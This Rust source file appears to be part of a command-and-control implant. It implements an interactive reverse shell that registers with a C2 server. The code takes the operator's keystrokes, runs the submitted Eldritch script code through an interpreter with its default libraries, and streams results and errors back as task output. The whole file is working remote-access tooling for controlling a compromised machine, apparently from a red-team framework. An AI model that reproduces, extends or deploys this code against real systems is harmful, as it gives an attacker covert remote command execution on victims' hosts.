use anyhow::Result;
use crossterm::{cursor, terminal, QueueableCommand};
use eldritch_core::Value;
use eldritch_repl::{Repl, ReplAction};
use eldritchv2::{Interpreter, Printer, Span};
use pb::c2::{
    ReportTaskOutputRequest, ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse,
    TaskError, TaskOutput,
};
use std::fmt;
use std::io::{BufWriter, Write};
use std::sync::Arc;
use transport::SyncTransport;

use crate::shell::parser::InputParser;
use crate::shell::terminal::{render, VtWriter};

pub fn run_repl_reverse_shell(
    task_id: i64,
    transport: Arc<dyn SyncTransport>,
) -> Result<()> {
    // Channels for transport stream
    let (transport_tx_req, transport_rx_req) = std::sync::mpsc::channel();
    let (transport_tx_resp, transport_rx_resp) = std::sync::mpsc::channel();

    #[cfg(debug_assertions)]
    log::info!("starting repl_reverse_shell (task_id={task_id})");

    // Initiate transport stream in background (SyncTransport spawns a task)
    transport.reverse_shell(transport_rx_req, transport_tx_resp)?;

    // Initial Registration
    if let Err(_err) = transport_tx_req
        .send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {_err}");
    }

    // Run REPL loop synchronously (this function blocks)
    run_repl_loop(task_id, transport_rx_resp, transport_tx_req, transport);
    Ok(())
}

fn run_repl_loop(
    task_id: i64,
    rx_resp: std::sync::mpsc::Receiver<ReverseShellResponse>,
    tx_req: std::sync::mpsc::Sender<ReverseShellRequest>,
    transport: Arc<dyn SyncTransport>,
) {
    let printer = Arc::new(ShellPrinter {
        tx: tx_req.clone(),
        task_id,
        transport: transport.clone(),
    });

    let mut interpreter = Interpreter::new_with_printer(printer)
        .with_default_libs();

    let mut repl = Repl::new();
    // VtWriter needs tx
    let stdout = VtWriter {
        tx: tx_req.clone(),
        task_id,
    };
    let mut stdout = BufWriter::new(stdout);

    let _ = render(&mut stdout, &repl, None);

    // State machine for VT100 parsing
    let mut parser = InputParser::new();
    let mut previous_buffer = String::new();

    while let Ok(msg) = rx_resp.recv() {
        if msg.kind == ReverseShellMessageKind::Ping as i32 {
            let _ = tx_req.send(ReverseShellRequest {
                kind: ReverseShellMessageKind::Ping.into(),
                data: msg.data,
                task_id,
            });
            continue;
        }
        if msg.data.is_empty() {
            continue;
        }

        // Parse input
        let inputs = parser.parse(&msg.data);
        let mut pending_render = false;

        for (i, input) in inputs.iter().enumerate() {
            #[cfg(debug_assertions)]
            log::info!("Handling input: {input:?}");
            let action = repl.handle_input(input.clone());
            match action {
                ReplAction::Render => {
                    pending_render = true;
                }
                other => {
                    if pending_render {
                        let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                        previous_buffer = repl.get_render_state().buffer;
                        pending_render = false;
                    }

                    match other {
                        ReplAction::Quit => return,
                        ReplAction::Submit { code, .. } => {
                            let _ = stdout.write_all(b"\r\n");
                            let _ = stdout.flush();

                            match interpreter.interpret(&code) {
                                Ok(v) => {
                                    if !matches!(v, Value::None) {
                                        let s = format!("{v:?}\r\n");
                                        let _ = stdout.write(s.as_bytes());
                                    }
                                }
                                Err(e) => {
                                    let s = format!("Error: {e}");
                                    let s_crlf = s.replace('\n', "\r\n");
                                    let final_s = format!("{s_crlf}\r\n");
                                    let _ = stdout.write(final_s.as_bytes());
                                }
                            }
                            let _ = render(&mut stdout, &repl, None);
                            previous_buffer.clear();
                        }
                        ReplAction::AcceptLine { .. } => {
                            let _ = stdout.write_all(b"\r\n");
                            let _ = render(&mut stdout, &repl, None);
                            previous_buffer.clear();
                        }
                        ReplAction::ClearScreen => {
                            let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
                            let _ = stdout.queue(cursor::MoveTo(0, 0));
                            let _ = render(&mut stdout, &repl, None);
                            previous_buffer = repl.get_render_state().buffer;
                        }
                        ReplAction::Complete => {
                            let state = repl.get_render_state();
                            let (start, completions) =
                                interpreter.complete(&state.buffer, state.cursor);
                            repl.set_suggestions(completions, start);
                            let _ = render(&mut stdout, &repl, None);
                            previous_buffer = repl.get_render_state().buffer;
                        }
                        ReplAction::None => {}
                        ReplAction::Render => unreachable!(),
                    }
                }
            }

            if i == inputs.len() - 1 && pending_render {
                let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
                previous_buffer = repl.get_render_state().buffer;
                pending_render = false;
            }
        }
    }
}

struct ShellPrinter {
    tx: std::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
    transport: Arc<dyn SyncTransport>,
}

impl fmt::Debug for ShellPrinter {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("ShellPrinter")
            .field("task_id", &self.task_id)
            .finish()
    }
}

impl Printer for ShellPrinter {
    fn print_out(&self, _span: &Span, s: &str) {
        let s_crlf = s.replace('\n', "\r\n");
        let display_s = format!("{s_crlf}\r\n");
        let _ = self.tx.send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data: display_s.into_bytes(),
            task_id: self.task_id,
        });

        let req = ReportTaskOutputRequest {
            output: Some(TaskOutput {
                id: self.task_id,
                output: format!("{s}\n"),
                error: None,
                exec_started_at: None,
                exec_finished_at: None,
            }),
        };
        let _ = self.transport.report_task_output(req);
    }

    fn print_err(&self, _span: &Span, s: &str) {
        let s_crlf = s.replace('\n', "\r\n");
        let display_s = format!("{s_crlf}\r\n");
        let _ = self.tx.send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data: display_s.into_bytes(),
            task_id: self.task_id,
        });

        let req = ReportTaskOutputRequest {
            output: Some(TaskOutput {
                id: self.task_id,
                output: String::new(),
                error: Some(TaskError {
                    msg: format!("{s}\n"),
                }),
                exec_started_at: None,
                exec_finished_at: None,
            }),
        };
        let _ = self.transport.report_task_output(req);
    }
}
